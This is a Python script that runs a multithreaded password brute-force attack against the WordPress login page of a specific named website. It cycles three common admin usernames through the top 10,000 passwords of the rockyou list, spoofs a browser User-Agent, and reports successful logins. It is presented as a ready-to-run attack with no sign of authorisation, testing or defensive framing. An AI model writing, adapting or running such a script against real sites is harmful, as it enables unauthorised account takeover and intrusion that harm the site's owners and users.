import requests
import sys
from concurrent.futures import ThreadPoolExecutor

url = 'https://www.hkmcsociety.com/wp-admin/wp-login.php'
users = ['admin', 'administrator', 'wpadmin']
passes = open('rockyou.txt', 'r').read().splitlines()[:10000]  # Top 10k

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

def try_login(user, pwd):
    data = {
        'log': user,
        'pwd': pwd,
        'wp-submit': 'Log In',
        'redirect_to': 'https://www.hkmcsociety.com/wp-admin/',
        'testcookie': '1'
    }
    r = session.post(url, data=data, allow_redirects=False)
    if r.status_code == 302 and 'wp-admin' in r.headers.get('Location', ''):
        print(f"[+] HIT: {user}:{pwd}")
        return True
    if 'incorrect' not in r.text.lower():
        print(f"[?] Possible: {user}:{pwd}")
    return False

with ThreadPoolExecutor(max_workers=10) as executor:
    for user in users:
        executor.map(lambda p: try_login(user, p), passes)